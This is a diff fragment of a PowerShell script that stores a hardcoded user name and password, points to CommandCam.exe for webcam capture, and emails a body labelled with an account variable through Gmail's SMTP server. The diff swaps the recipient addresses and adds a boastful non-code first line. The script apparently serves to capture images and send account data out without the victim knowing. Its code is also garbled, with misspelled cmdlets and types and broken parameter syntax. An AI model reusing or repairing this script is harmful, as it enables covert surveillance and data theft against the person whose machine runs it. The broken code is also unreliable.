@@ -1,3 +1,4 @@
+Lennart best script in the world
 $user = 'UserName '
 $pass = ConvertTo-secureString - String 'Password'  -AsplainText -Force
 $credential = New-Objective  -TypeName system.Management. Automation.PSCredendtial  - ArgumentList $user , $pass
@@ -11,8 +12,8 @@ $CmdCam = " \cmdcam\CommandCam.exe"
 
 $msg_PARAMS =@{
 From = $user
-To = 'example@gmail.com'
-Cc = 'example@gmail.com'
+To = 'example@coolemail.com'
+Cc = 'example@coolgmail.com'
 Subject = $Subject 
 Body = $MSAccount
 smtpServer = 'smtp.gmail.com' #google's smtp
